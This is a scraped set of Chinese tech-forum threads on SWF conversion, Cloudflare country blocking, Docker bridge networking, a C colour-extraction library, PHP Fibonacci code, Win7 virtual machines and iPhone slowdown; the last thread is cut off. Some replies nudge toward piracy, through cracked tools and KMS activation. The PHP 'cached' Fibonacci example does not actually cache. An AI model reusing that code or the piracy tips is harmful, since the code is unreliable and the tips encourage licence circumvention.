{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近有学习视频（ SWF 格式），想放在 PAD 上看，但没支持 SWF 格式的播放器，然后在网上查询，尝试许久，没有找到合适的，格式工厂感觉只是大众化的产物，面对专业性的东西就显得很鸡肋，请问大家有什么合适的软件提供？\n其实只是简单的想通过 SWF 格式转换成 MP4 或别的主流的视频格式</p>\n</div></div>"], "reply": "9", "tittle": "SWF 视频转换？", "comment": ["既然要专业的，还只要简单的转换，你这要求前后矛盾\r", "简单转换就用格式工厂，专业的就用 MediaCoder", "格式工厂", "FreemakeVCPortable ，非常好用，新版本有水印了，我这有个老版本的 链接:  ", "  密码: 7auf", "我经常把 SWF 转换为 HTML5 ，然后它会输出(mp4/webm/ogv)三种格式，放在网页里很方便", "市面的软件一般都是录制的方式，如果 swf 略占内存，视频也会卡。最后我选择了 ae..", " 推荐的，各种版本用不起，我放在 portable 里也一样", " 会不会文件本身不是 SWF 视频，而是像那种带交互的课件或者游戏", " 对的，是我没说清楚。学习视频嘛，就是带交互的课件，呵呵"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>Csf 防火墙屏蔽了国内的 ip ，却无法屏蔽国内的域名直接访问。怎么做？  用了 cloudflare 的 cdn</p>\n</div></div>"], "reply": "3", "tittle": "后端伙伴们， Csf 防火墙屏蔽了国内的 ip，却无法屏蔽国内的域名直接访问。怎么做？", "comment": ["什么叫国内的域名直接访问\r", "\r", "用 CF 的话 他们直接头部有个 header 是输出国家的 屏蔽掉即可", "  就是国内的用户输入域名也无法打开网站， cf 头部有个 header 是输出国家的？文件在哪个位置？如何屏蔽？有教程吗请问。", " 头部信息 request 会显示 你搜索下"]},
{"content": ["<div class=\"topic_content\">新西兰首都惠灵顿推出一项名为 Looksee Wellington 的全球百人 IT 人才招募计划，顺利入选的 100 名人才将于今年 5 月到惠灵顿，与惠灵顿当地的科技公司进行面试，并且，面试者前往惠灵顿的机票食宿费用全免。\r<br>    这一项目是由新西兰中央政府、 Workhere NZ 和惠灵顿地区经济发展局 WREDA 共同合作推出的，旨在吸引全球的高科技人才，解决惠灵顿 IT 技术人才短缺的现状。\r<br>    LookSee Wellington 计划会从注册的报名者中精选出 100 名候选人，为他们支付惠灵顿的机票和住宿费用。到达惠灵顿后，这些候选人将与一些顶尖的技术和 IT 公司进行一系列预先安排的面试。\r<br>报名注册网址： <a target=\"_blank\" href=\"http://www.wellingtonnz.com/work/looksee-wellington/\" rel=\"nofollow\">http://www.wellingtonnz.com/work/looksee-wellington/</a>\r<br>FAQs ： <a target=\"_blank\" href=\"https://www.wellingtonnz.com/work/looksee-wellington/looksee-wellington-faqs/\" rel=\"nofollow\">https://www.wellingtonnz.com/work/looksee-wellington/looksee-wellington-faqs/</a>\r<br>　　报名截止日期为 3 月 20 日。\r<br>       刚才网上发现的消息 有兴趣的可以看看\r<br>What type of tech talent is needed?\r<br>Our tech industry is flying along and we specifically need more mid-senior tech people. We are looking to full roles such as DevOps Engineers, Developers (Javascript, iOS, .Net, Front end, Android, PHP, Rails), Integrations Specialists, Test Analysts, IP Network Engineers, Systems Administrators) and more. \r<br>\r<br>Unfortunately for this specific campaign, we are not looking for non-tech candidates.</div>"], "reply": "18", "tittle": "新西兰全球招募 IT 人才 机票住宿全免", "comment": ["我是没希望了的。楼下 dalao", "我是没希望了的。楼下 dalao", "1.先填表\r", "2.筛选\r", "3.电面(video)\r", "4.才有机会百里挑一", "想起我朝的国家千人计划……", "我是没希望了的。楼下 dalao", "马克，二十年再来", "没雅思 6.5 别过来，工作不代表移民呀。", "官网已挂", "先报名体验一下, 选不上没关系. 增加一下根外国机构沟通的机会.", "竟然么有 Java", "无题\r", "\r", "由 a13861\r", "\r", "忧郁的黑客 / 2017-03-03 18:18\r", "\r", "\r", "新西兰政府最近搞全球人才海选，提供免费机票和酒店让人来面试。\r", "\r", "我觉得新西兰的主要问题不是缺人才（确实缺人才）。新西兰缺的是有远见的企业家，和风险投资。以新西兰目前的状况，即使最牛逼的人来，也找不到用武之地。", "11 楼这么吊，发动选举吧", " 我觉得也不是缺企业家 而是缺人 澳新整个市场加起来也才半亿人 做个大陆性的网站可能会跟国内的地方性网站什么的差不多 何况澳洲还有好多地方不通网络 额", "果断申请\r", "小前端想找个出国的机会感觉好难啊...", "已注册，看看运气如何", " 同是前端 祝好运！", "注册了没有找到填简历的地方啊。", " 我觉得前端大多就不可能……不过鉴于各位是大佬……"]},
{"content": ["<div class=\"topic_content\">之前把 caps lock 和 左 ctrl 换了一下位置，现在发现经常按 左 shift 小拇指也很疼，有人有什么解决方法吗？试过把 left alt 改成 left shift ， 但是用起 alt 来就不是很方便了\r<br>我平常用的是 罗技 MK550\r<br>现在发现微软  Sculpt Ergonomic 这种把空格拆成两半的应该比较适合我的情况</div>"], "reply": "12", "tittle": "解决小拇指按 left shift 的问题", "comment": ["是不是键盘太硬了; \r", "我平时都是手掌侧面按 ctl,剩下都是小指按, 也没有疼.", "把 shift 的弹簧换成压力系数比较小的，我是把小手指区域的弹簧全换了的", " 麻烦问下哥们用的键盘型号，我是觉得现在用的这个罗技最左边一溜 button 都硬的厉害。\r", " 这玩意还能换。。。什么键盘支持换弹簧的啊？", "cherry 原厂, 红轴", "用软件改个 Dual-role key\r", "比如 空格键 按住为 shift, 按一下为空格", "要不还是换轴吧?", "我是拿无名指按 Ctrl 和 Shift 的，一起按的时候会加上中指。", "嗯,ctrl 是我键盘打油最严重的.", "小手指多锻炼锻炼就好了", "改成脚踏板。", "机械轴可以换弹簧，打开轴的盖子就可以换，淘宝上专用的弹簧也很便宜", " 哈哈哈哈哈"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>本来是想买个公文包，但是装电脑可能就太重了，又不想落个斜肩，现在转念想买个双肩包，知乎和 smzdm 推荐的太多了，不想弄得太时尚，毕竟上班时间都是商务或者商务休闲，还是商务范一些好点，不要太有学生气，毕竟也是而立的人了，这些个选一个吧，最好有功能分区，有用过的来推荐，顺便说说理由吧：\n小米双肩包\nknomo falmounth\nincase city\nlexon</p>\n</div></div>"], "reply": "20", "tittle": "最近被选包的事情困扰着", "comment": ["我买的这款。黑色皮质双肩包，够商务吧。\r", "功能。。。其实我从小到大，包里给设计的装笔的啊，各种小口袋我都没怎么用过，这个包都有。\r", "我觉得也挺大的。曾经装了个 pro ，一条牛仔裤，两件衬衣一条短裤，两双袜子两条内裤。一个电脑电源，电动牙刷旅行盒。然后出发前买了点零食也塞进去了。。。还有富余。就是不知道样子楼主喜欢不喜欢。\r", " \r", "\r", "timbuk2 amazon 760 入手的", "知道了...incase city 学生气╮(￣⊿￣)╭", "在用 incase 不错. 主要是不贵", "用的是 incase city", "日常包要轻，日常包要轻，日常包要轻。", " 哈哈 incase 真不错，可能就是不太搭西装，回复多次了谢谢啦", "thule", "日常包，美旅的，然后让同事认为每天都在旅行。。。", " 太休闲了", " 我有一个多特的小登山包，穿衬衣背这个感觉太……酸爽了", " 开车上下班，影响不大", "买了外星人之后，发现外星人的包还是不错的， 233", "建议说下预算和外观要求\r", "要好看还是要商务\r", "需要考虑时尚吗", " nvm 我少看了两行\r", "如果 lz 要商务的话 黑色帆布 /皮包应该都可以 如果要耐操最好要帆布包\r", "便宜的 crumpler Y3\r", "贵的大牌都可以", "tumi", " \r", " \r", "1.预算 1000 以下， 2.能放 13.3 电脑， 3.有颜值，偏商务吗， 4.抗造", "始祖鸟 blade 6", " 1000 以下选择就比较少了 而且肯定丑...", "现在中国亚马逊上箱包类 38 折，可以看看"]},
{"content": ["<div class=\"topic_content\">现在是想我可以看别人，是不是别人也可以看到我的信息，是因为在同一个局域网的原因吗？还是。。。\r<br>\r<br>《黑客军团》看多了？</div>"], "reply": "8", "tittle": "win10 网络位置，出现别人的手机，可以点进去看些。。。", "comment": ["蓝牙配对了吧", "所以我在外面一般不连 wifi ，在家里面我的 wifi 不给别人用", " 电脑没蓝牙，应该是网络工作组的原因", "你的路由保存的信息，就是以前连过你路由的手机保存在路由了， Win 10 会显示出来…", "\r", "\r", "之前也遇到同样的问题 关闭路由器的 upnp 功能即可。", "为什么呢？", "所以 到底是什么问题 为什么关闭 Upnp 就好了？", " 大概是 Windows 自己的流媒体服务的原因。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><blockquote>\n<p>原文地址： <a href=\"https://xcoder.in/2017/03/03/byakuren/\" rel=\"nofollow\">https://xcoder.in/2017/03/03/byakuren/</a></p>\n</blockquote>\n<p>好久没发文章了，借着 Byakuren 开源的档口炒炒冷饭吧。</p>\n<p>先上 Repo 地址：<a href=\"https://github.com/XadillaX/byakuren\" rel=\"nofollow\">https://github.com/XadillaX/byakuren</a>。</p>\n<h2>主题色</h2>\n<p>图像主题色是从一张图像中提取出来最能代表这张图片主色调的多种颜色。 也就是说在一幅色彩斑斓的图片里面，各种不同颜色的数量就对应着该颜色在图 片中的比例，程序可以通过计算图片中不同颜色的像素数来算出主题色。</p>\n<h3>主题色提取算法</h3>\n<p>提取的算法在我之前的博客中有说明。在 Byakuren 中其实用的就是之前博客中讲的一些算法。</p>\n<ul>\n<li><a href=\"https://xcoder.in/2014/09/17/theme-color-extract/#%E5%85%AB%E5%8F%89%E6%A0%91%E6%8F%90%E5%8F%96%E6%B3%95\" rel=\"nofollow\">八叉树提取法</a></li>\n<li><a href=\"https://xcoder.in/2014/09/17/theme-color-extract/#%E6%9C%80%E5%B0%8F%E5%B7%AE%E5%80%BC%E6%B3%95\" rel=\"nofollow\">最小差值法</a></li>\n</ul>\n<p>除去上面两种算法， Byakuren 还提供了将这两种算法结合起来的 Mix 算法。</p>\n<h2>Byakuren</h2>\n<p>Byakuren 是我前两年写的一个主题色提取库，也是继 <a href=\"https://github.com/XadillaX/thmclrx/tree/e302b61b4cc70b24efa35c612899cc0b79d271f9\" rel=\"nofollow\">thmclrx</a> 之后的 C 版实现，个人认为代码质量比旧版的 thmclrx 要高。并且它实际上经过了企业级的验证，在某相关的公司已经欢快跑了有些年头了。</p>\n<blockquote>\n<p>在经过相关人员的同意下，我也算把这雪藏了好久的代码给开源出来了。</p>\n</blockquote>\n<h3>伪·Byakuren 是什么？</h3>\n<p><img alt=\"byakuren\" src=\"https://xcoder.in/2017/03/03/byakuren/byakuren.png\"></p>\n<blockquote>\n<p>聖 白蓮（ひじり びゃくれん， Hiziri Byakuren ）是系列作品《东方 project 》中的角色，首次登场于《东方星莲船》。</p>\n<ul>\n<li>种族：魔法使</li>\n<li>能力：使用魔法程度的能力（酣畅增强身体能力的）</li>\n<li>危险度：不明</li>\n<li>人类友好度：中</li>\n<li>主要活动场所：命莲寺之类</li>\n<li>命莲寺的住持。虽然原本是人类，不过由于常年的修行已经完全超越了人类。现在已经属于人们常说的魔法使了。</li>\n</ul>\n<p>虽然已经入了佛门，但是不知道什么原因却被妖怪敬仰着。她从来没有像童话故事中的魔法使那样，念诵着咒语治退妖怪。使用的力量完全是邪恶的，一点都不像是圣人，虽然并没有人目击到她与人类为敌，但其实已彻底成为妖怪的同伴了。</p>\n</blockquote>\n<p>好吧，总之本人是个东方控，所以基本上项目名都跟东方有关。</p>\n<h3>真·Byakuren 是什么？</h3>\n<p>如文章题目所说，它是一个 C 实现的开源主题色提取的库，大家可以把它编译成链接库使用。</p>\n<p>不过目前暂时只支持 Makefile 的形式来编译，大家如果有兴趣也可以自己建个 Windows 下的 Visual Studio 项目等，也欢迎提类似于 CMake 之类的 PR 。</p>\n<h3>使用</h3>\n<p>其实详细的使用方法在<a href=\"https://github.com/XadillaX/byakuren#byakuren\" rel=\"nofollow\">文档</a>中就有说明。</p>\n<p>不过这里还是简单介绍一下吧。</p>\n<h4>Clone</h4>\n<p>先把代码给下下来，你也可以把它 Clone 下来。总之仓库地址是：<a href=\"https://github.com/XadillaX/byakuren\" rel=\"nofollow\">https://github.com/XadillaX/byakuren</a>。</p>\n<h4>make</h4>\n<p>然后跑到目录下执行 <code>make</code>。</p>\n<pre><code>$ make byakuren\n</code></pre>\n<p>你将得到一个 <code>byakuren.a</code> 的静态链接库。</p>\n<p>这个时候你只要拿着这个静态链接库，然后顺便在你的项目中把头文件引进来就可以了。</p>\n<pre><code>#include \"byakuren.h\"\n</code></pre>\n<h4>API</h4>\n<p>我们假设你有 <code>bkr_rgb* rgb</code> 的图片像素信息，以及 <code>uint32_t color_count</code> 的图片像素总数两个变量，下面分别给出三个样例。具体的 API 解析还请去文档观摩。</p>\n<h5>Octree</h5>\n<pre><code>bkr_color_stats stats[256];\nbkr_octree_node* root = bkr_build_octree(rgb, color_count, 256);\nint colors = bkr_octree_calculate_color_stats(root, stats);\nbkr_release_octree(root);\n</code></pre>\n<blockquote>\n<p><code>colors</code> 就是主题色数量了，传进去的 <code>stats</code> 就会接收到主题色的具体信息了。</p>\n</blockquote>\n<h5>Min-diff</h5>\n<pre><code>bkr_color_stats stats[256];\nbkr_mindiff_parameter param;\nparam.gray_offset = 5;\nparam.palette = NULL;\nint colors = bkr_mindiff_calculate_color_stats(rgb, color_count, stats, &amp;param);\n</code></pre>\n<blockquote>\n<p><code>colors</code> 和 <code>stats</code> 如上所述。</p>\n</blockquote>\n<h5>Mix</h5>\n<pre><code>bkr_color_stats stats[256];\nbkr_mindiff_parameter param;\nparam.gray_offset = -1;\nparam.palette = NULL;\nint colors = bkr_mix_calculate_color_stats(rgb, color_count, 256, &amp;param, stats);\n</code></pre>\n<blockquote>\n<p><code>colors</code> 和 <code>stats</code> 如上所述。</p>\n</blockquote>\n<h3>预览一下</h3>\n<p>可能有人想看看效果，我这里就放个效果图给大家看看吧。</p>\n<p>其中 Octree 和 Mix 两个算法的主题色最大数量参数传的都是 16 。</p>\n<p><img alt=\"效果预览\" src=\"https://xcoder.in/2017/03/03/byakuren/result.png\"></p>\n<h3>能做什么？</h3>\n<p>你可以拿它来写一些主题色提取的东西。</p>\n<p>你也可以拿它来完成其它语言的主题色提取库的封装，如 Python 、 Lua 等等。欢迎反馈给我。</p>\n<h2>结束语</h2>\n<p>把一份自己觉得还不错的代码开源出来的感觉特爽，尤其是这种重见天日的感觉。ﾍ|･∀･|ﾉ*~●</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "Byakuren：一个 C 实现的主题色提取库", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>上一回合，小白折腾了 Docker 架构，铁要趁热我开始学习 Docker 容器网络。此刻的心情，是激动的，也是不安的。激动是因为终于要面对 Docker 的第一座大山 ：<strong>网络</strong>，不安是因为网络问题一直以来都是小白的软肋，那些年我们一起学过的网络知识，如今。。。</p>\n<p>硬着头皮翻开《 Docker 进阶与实战》开始 Docker 网络初探，里面讲述了 Docker 容器网络的好几种模式。其中 “ bridge “ 模式成功的吸引了我的注意。 bridge 模式俗称桥接模式，关于它的定义小白早就忘了，但不难理解的是 bridge 的作用，<strong>bridge 可以连接不同的东西</strong>。</p>\n<p>早期的二层网络中， bridge 可以连接不同的 LAN 网，如下图所示。当主机 1 发出一个数据包时， LAN 1 的其他主机和网桥 br0 都会收到该数据包。网桥再将数据包从入口端复制到其他端口上（本例中就是另外一个端口）。因此， LAN 2 上的主机也会接收到主机 A 发出的数据包，从而实现不同 LAN 网上所有主机的通信。</p>\n<p><img alt=\"\" src=\"http://of9x2nzks.bkt.clouddn.com/17-2-9/84653321-file_1486642342531_12c9d.png\"></p>\n<p>随着网络技术的发展，传统 bridge 衍生出适用不同应用场景的模式，其中最典型要属 <strong>Linux bridge</strong> 模式，它是 Linux Kernel 网络模块的一个重要组成部分，用以保障不同虚拟机之间的通信，或是虚拟机与宿主机之间的通信，如下图所示 ：</p>\n<p><img alt=\"\" src=\"http://hicu.be/wp-content/uploads/2016/03/linux-bridge.png\"></p>\n<p>依葫芦画瓢， Docker bridge 十有八九是用来连接不同容器，或是连接容器与宿主机的。</p>\n<p>带着疑问，我快速浏览了这个章节，结果是大惊从早到晚失色，书中的介绍比我预想的复杂很多， Docker bridge 模式不仅使用了 <strong>veth pair</strong>技术，还使用了<strong>网络命名空间技术</strong>，更令我吃惊的是， Docker bridge 模式下竟然采用了 <strong>NAT</strong>方式。 Docker bridge 和 Linux bridge 二者，初看如出一辙，再看又相去甚远，还真是傻傻分不清楚。没想到我的容器网络学习计划，刚起步便遭遇了滑铁卢。</p>\n<p>没有搞清楚 Docker bridge 与 Linux bridge 的区别前，这书简直没法看了。依小白的经验，云里雾里的时候摸清楚基本概念最有效，先从 Linux bridge 模式的基本工作原理入手，再从 Docker bridge 模式下的 “黑科技” （ veth pair 、网络命名空间技术、 NAT ）入手 ，或许能找出点头绪。压抑住内心的愤懑，我翻开了《深入理解 LINUX 网络技术的内幕》，找寻这些关键字的足迹。</p>\n<h2>Linux bridge 模式</h2>\n<p>Linux bridge 模式下， Linux Kernel 会创建出一个 <strong>虚拟网桥</strong>，用以实现<strong>主机网络接口</strong>与<strong>虚拟网络接口</strong>间的通信。从功能上来看， Linux bridge 像一台虚拟交换机，所有桥接设置的虚拟机分别连接到这个交换机的一个接口上，接口之间可以相互访问且互不干扰，这种连接方式对物理主机而言也是如此。</p>\n<p><img alt=\"\" src=\"http://of9x2nzks.bkt.clouddn.com/17-2-10/57064083-file_1486713557294_5239.png\"></p>\n<p>在桥接的作用下，虚拟网桥会把主机网络接口接收到的网络流量转发给虚拟网络接口，于是后者能够接收到路由器发出的 DHCP （动态主机设定协议，用于获取局域网 IP ）信息及路由更新。这样的工作流程，同样适用于不同虚拟网络接口间的通信。具体的实现方式如下所示：</p>\n<p><strong>虚拟机与宿主机通信：</strong> 用户可以手动为虚拟机配置 IP 地址、子网掩码，该 IP 需要和宿主机 IP 处于同一网段，这样虚拟机才能和宿主机进行通信。</p>\n<p><strong>虚拟机与外界通信：</strong> 如果虚拟机需要联网，还需为它手动配置网关，该网关也要和宿主机网关保持一致。</p>\n<p>除此之外，还有一种较为简单的方法，那就是虚拟机通过 DHCP 自动获取 IP ，实现与宿主机或宿主机以外的世界通信，小白亲测有效。</p>\n<h2>Docker bridge 模式</h2>\n<p>大致清楚 Linux bridge 模式后，再来看 Docker bridge 模式，小白也有了信心。再次翻开《 Docker 进阶与实战》，仔细阅读后小白了解到在该 bridge 模式下， Docker Daemon 会创建出一个名为 docker0 的<strong>虚拟网桥</strong>，用来连接<strong>宿主机</strong>与<strong>容器</strong>，或者连接<strong>不同的容器</strong>，书中的介绍与小白之前的假设也不谋而合。</p>\n<p>Docker 利用 veth pair [注释 1]技术，在宿主机上创建了两个虚拟网络接口 veth0 和 veth1 （ veth pair 技术的特性可以保证无论哪一个 veth 接收到网络报文，都会无条件地传输给另一方）。</p>\n<p><img alt=\"\" src=\"http://of9x2nzks.bkt.clouddn.com/17-2-14/85480116-file_1487060128409_12583.png\"></p>\n<p><strong>容器与宿主机通信 :</strong> 在桥接模式下， Docker Daemon 将 veth0 附加到 docker0 网桥上，保证宿主机的报文有能力发往 veth0 。再将 veth1 添加到 Docker 容器所属的网络命名空间[注释 2]，保证宿主机的网络报文若发往 veth0 可以立即被 veth1 收到。</p>\n<p><strong>容器与外界通信 :</strong>  容器如果需要联网，则需要采用 NAT [注释 2] 方式。准确的说，是 NATP (网络地址端口转换) 方式。 NATP 包含两种转换方式： SNAT 和 DNAT 。</p>\n<ul>\n<li>目的 NAT (Destination NAT ， DNAT): 修改数据包的目的地址。</li>\n</ul>\n<p>当宿主机以外的世界需要访问容器时，数据包的流向如下图所示：</p>\n<p><img alt=\"\" src=\"http://of9x2nzks.bkt.clouddn.com/17-2-14/6340841-file_1487059875663_11775.png\"></p>\n<p>由于容器的 IP 与端口对外都是不可见的，所以数据包的目的地址为 <strong>宿主机</strong> 的<strong>ip</strong>和 <strong>端口</strong>，为 192.168.1.10:24 。</p>\n<p>数据包经过路由器发给宿主机 eth0 ，再经 eth0 转发给 docker0 网桥。由于存在 DNAT 规则，会将数据包的目的地址转换为<strong>容器</strong>的<strong>ip</strong>和<strong>端口</strong>，为 172.17.0.n:24 。</p>\n<p>宿主机上的 docker0 网桥识别到容器 ip 和端口，于是将数据包发送附加到 docker0 网桥上的 veth0 接口， veth0 接口再将数据包发送给容器内部的 veth1 接口，容器接收数据包并作出响应。</p>\n<p><img alt=\"\" src=\"http://of9x2nzks.bkt.clouddn.com/17-2-14/46001748-file_1487060516664_10205.png\"></p>\n<ul>\n<li>源 NAT (Source NAT ， SNAT): 修改数据包的源地址。</li>\n</ul>\n<p>当容器需要访问宿主机以外的世界时，数据包的流向为下图所示：</p>\n<p><img alt=\"\" src=\"http://of9x2nzks.bkt.clouddn.com/17-2-14/17513270-file_1487059880951_b07a.png\"></p>\n<p>此时数据包的源地址为<strong>容器</strong>的<strong>ip</strong>和<strong>端口</strong>，为 172.17.0.n:24 ，容器内部的 veth1 接口将数据包发往 veth0 接口，到达 docker0 网桥。</p>\n<p>宿主机上的 docker0 网桥发现数据包的目的地址为外界的 IP 和端口，便会将数据包转发给 eth0 ，并从 eth0 发出去。由于存在 SNAT 规则，会将数据包的源地址转换为<strong>宿主机</strong>的<strong>ip</strong>和<strong>端口</strong>，为 192.168.1.10:24 。</p>\n<p>由于路由器可以识别到宿主机的 ip 地址，所以再将数据包转发给外界，外界接受数据包并作出响应。这时候，在外界看来，这个数据包就是从 192.168.1.10:24 上发出来的， Docker 容器对外是不可见的。</p>\n<p><img alt=\"\" src=\"http://of9x2nzks.bkt.clouddn.com/17-2-14/9364178-file_1487060536255_35bc.png\"></p>\n<p>##小结</p>\n<p>小白的容器网络学习只是刚刚开了头，竟也能折腾出这么多玩儿意，有 veth pair ，有网络命名空间， 还有 NAT 。虽说 docker bridge 模式仅仅是容器网络的冰山一角，后面的学习之路仍然且行且艰辛，但小白也掌握了一些学习经验，那就是面对错综复杂的网络模式，首先需要识其筋骨胜肉，抓住本质含义。小白就是凭着对 bridge 的理解，才展开了一系列大胆的假设，带着问题最终在书中得到求证。 Disappointing, but not fatal 。</p>\n<p>[注释 1] veth pair 是用于不同 network namespace 间进行通信的方式， veth pair 将一个 network namespace 数据发往另一个 network namespace 的 veth 。</p>\n<p>[注释 2] 网络命名空间是用于隔离网络资源（/proc/net 、 IP 地址、网卡、路由等）。由于一个物理的网络设备最多存放在一个网络命名空间中，所以通过 veth pair 在不同的网络命名空间中创建通道，才能达到通信的目的。</p>\n<p>[注释 3] NAT 为网络地址转换（ Network Address Translation ）的缩写，是一种在 ip 数据包通过路由器或防火墙时重写来源 ip 地址或目的 ip 地址的技术。</p>\n<p><strong>作者介绍 | Evelyn</strong></p>\n<p>DaoCloud 容器技术开源团队成员，曾在 Intel DCG 部门担任 Cloud Engineering, 对分布式调度框架 Mesos 有深入学习，对集群资源管理有一定经验，目前致力于 Docker 容器技术的研究和实践。 Evelyn 所在的容器技术开源团队，在 DaoCloud 主要负责容器生态的开源工作。</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "探索 Docker bridge 的正确姿势 小白亲测有效！", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我们在用 <a href=\"http://code.aliyun.com\" rel=\"nofollow\">code.aliyun.com</a> ，就是原来的淘宝 code ，淘蝌蚪。\n但是最近发现出现了数据不一致的现象，在服务器上 Pull 下来的内容和本地开发机不同。是否有朋友也遇到一样的情况？\n顺便求国内可用的不出大故障的代码托管。 OSC ， coding ， bitbucket ，哪个靠谱些?</p>\n</div></div>"], "reply": "10", "tittle": "阿里 Code 是不是最近不稳定？", "comment": ["visual studio online 。稳定性一流", "OSC 以前很不稳定，据说现在好些了。但已经弃用。\r", "\r", "BitBucket 比较稳定但国内环境……慢。\r", "\r", "我是自己装了套 Gitlab ，然后每天备份。实际上很稳定，唯一两次重启都是因为升级。正常运行了应该有一年了。", "gogs 或者 gitlab 吧", "不确定，但是是否 git 是否上出现什么问题？", "coding 时不时的也会宕几次, 不过鉴于毕竟在国内速度还行, 也就那样了.", "最近几天却是遇到这样的问题。前一分钟还能提交正常，过一会就提交不了了。", "今天试已经正常了。", " Git 也不行。出现代码不一致。有些 commit 在远程不体现。被坑了好几个整天。\r", " 速度如何？\r", " @", " 维护成本如何？我们小团队。\r", " 但愿不会再出问题了。", "gitlab 感觉基本没维护成本, 挺省心的.", " Gitlab 文档相对来说比较齐全，部署后有 CLI 命令可用，备份只是一个命令的事。\r", "\r", "日常维护很容易，况且我只是一个前端 :D"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><pre><code>&lt;?php\n\n$time1= microtime();\n//普通递归\nfunction fib($n)\n{\n    if ($n &lt; 2) {\n        return 1;\n    }\n    return fib($n - 1) + fib($n - 2);\n}\n\necho fib(30);\necho PHP_EOL;\necho microtime()-$time1;\necho PHP_EOL;\n$time2 = microtime();\n//缓存  空间换时间\nfunction fib2($n)\n{\n    $tmp = [];\n    if (isset($tmp[$n]) &amp;&amp; $tmp[$n] != 0)\n        return $tmp[$n];\n\n    if ($n &lt; 2) {\n        $tmp[$n] = 1;\n        return 1;\n    } else {\n        $tmp[$n] = fib2($n - 1) + fib2($n - 2);\n        return $tmp[$n];\n    }\n}\n\necho fib2(30);\necho PHP_EOL;\necho microtime()-$time2;\necho PHP_EOL;\n$time3 = microtime();\n\n//尾递归\nfunction fib3($a, $b ,$n)\n{\n    if ($n == 0) {\n        return $a;\n    } else {\n        return fib3($a+$b, $a, $n-1);\n    }\n}\necho fib3(1, 0 , 30);\necho PHP_EOL;\necho microtime()-$time3;\n</code></pre>\n<p>在数据量比较大的情况下尾递归的效率就超级高啦</p>\n</div></div>"], "reply": "5", "tittle": "使用递归实现 fibonacci 函数。所谓 fibonacci 函数，就是输入 n，输出 fibonacci 队列的第 n 项。", "comment": ["what's the point?", "用矩阵快速幂可以 O(logN)", " #2  嗯 这个应该是最优的，敢请大神展示代码", "If you insist.\r", "\r", "function matrix_mult_2_2($a, $b) {\r", "  $c = [\r", "    [$a[0][0] * $b[0][0] + $a[0][1] * $b[1][0], $a[0][0] * $b[0][1] + $a[0][1] * $b[1][1]],\r", "    [$a[1][0] * $b[0][0] + $a[1][1] * $b[1][0], $a[1][0] * $b[0][1] + $a[1][1] * $b[1][1]],\r", "  ];\r", "  return $c;\r", "}\r", "\r", "function optimized_fib($n) {\r", "  $vector = [1, 1];\r", "\r", "  $result = [\r", "    [1, 0],\r", "    [0, 1]\r", "  ];\r", "\r", "  $base = [\r", "    [1, 1],\r", "    [1, 0]\r", "  ];\r", "\r", "  while ($n > 0) {\r", "    if ($n % 2) {\r", "      $result = matrix_mult_2_2($result, $base);\r", "    }\r", "    $base = matrix_mult_2_2($base, $base);\r", "    $n = $n / 2;\r", "  }\r", "  return $result[1][0];\r", "}\r", "\r", "在 n >= 10000 的时候会体现出优势。", " #4 看来要把数学书翻出来看看了"]},
{"content": ["<div class=\"topic_content\">1 、虚拟机 win7 中毒会不会导致我主机也中毒的？\r<br>2 、虚拟机里面的 win7 破解，也能使用一般的破解工具破解吗？</div>"], "reply": "4", "tittle": "我 iMac 用虚拟机装了 win7，然后我想问两个问题", "comment": ["1. 不会。不过如果虚拟机挂载了宿主机的某个目录，并开放了写权限和执行权限，那么倒是有风险。但是你宿主机是 macOS ，虚拟机是 Windows ，同时能感染\r", "Windows 和 macOS 的病毒，我还没听说过。如果你虚拟机并没有挂载宿主机的目录，那就更不用担心了。\r", "2. 微软提供有免费的 Windows 虚拟机： ", "\r", "虽然有 90 天的限制，但是也够用了。到期了重装一下就行。何必用盗版。", " 好谢谢，再问一个问题\r", "在虚拟机 win7 那下载的东西，在主机那里找得到吗？", "虚拟机下载的东西可以通过共享目录访问，或是建个 ftp 、 http 之类的服务来访问文件", "虚拟机里面 win7 激活和普通 pc 安装是一样的，可以用 kms 激活"]},
{"content": ["<div class=\"topic_content\">手里两台 iphone ，一台 6p 一台 6s ，毫不离奇的都是越用月卡，开始我以为是 app 装载过多的原因，卸掉了不少后，发现还是没有改观，无论是运行阿里出的吊癌应用淘宝、支付宝，或者 ios 系统本身，特么能感觉到明显的卡顿这得卡成什么样？\r<br>\r<br>在 ios6 ios7 时代我记得不是这样，手机无论怎么用，起码不会卡顿。\r<br>\r<br>而且更有意思的一点， Android 卡顿我还知道怎么治疗，多种办法， iphone 卡顿我完全没办法。\r<br>\r<br>6 年 ios 用户，快受不了了。</div>"], "reply": "191", "tittle": "认真讨论下，为什么 iPhone 越用越卡？", "comment": ["标题写错了吧， 不应该是安卓越用越卡？", " 这才是正解，应该不能说卡，确实有些迟钝的感觉。", "现在其实倒过来了，在高配置 Android 机器里，用了很久也不会怎么卡", "确实是越来越卡， 6s 。去年底买的荣耀 8 反而很爽...最近刚上了 Android 7.0 。", "越用越卡是因为安装的 app 功能越来越复杂、越来越臃肿吧。我感觉 Android 上就是这样子。开发者和产品经理们总是有相当新的机器，所以他们不会觉得卡，但是用户的机器更新慢了就会卡得不行了。", "怀疑你用的假 iPhone", "同感。就算我不升级，也越用越慢。", "嗯...升级了 ios10 很卡...偶然机会重置了一次手机, 竟然不卡了\r", "\r", "5s", "旧硬件和新系统新软件是天生的心有余而力不足，就好像让中年人去学下围棋，肯定不能和少年同日而语。", " 从来没坏过 home 键的路过。从 4 到 7 ，没用过小白点，一直按压，没坏过一次。（ 4 、 4S 、 5S 、 6 、 6S 、 7P ）", "同感，搞得我有点怀疑应不应该升级了", "我觉得非常流畅啊。 6s ios10 。从 5s 转过来的。想要多快，能用不就行了。。。", "最适合老爷机的电脑系统就是旧系统，配置老 新系统带不动。这在一般常识。\r", "\r", "在电脑时代，谁也不会催着老爷机升级新系统\r", "\r", "在手机时代，天天有人在要赶快升级到新系统享受什么新功能。\r", "\r", "一般电脑升级 2 个系统就带不动了，因为新系统的硬件要求摆在那里。\r", "\r", 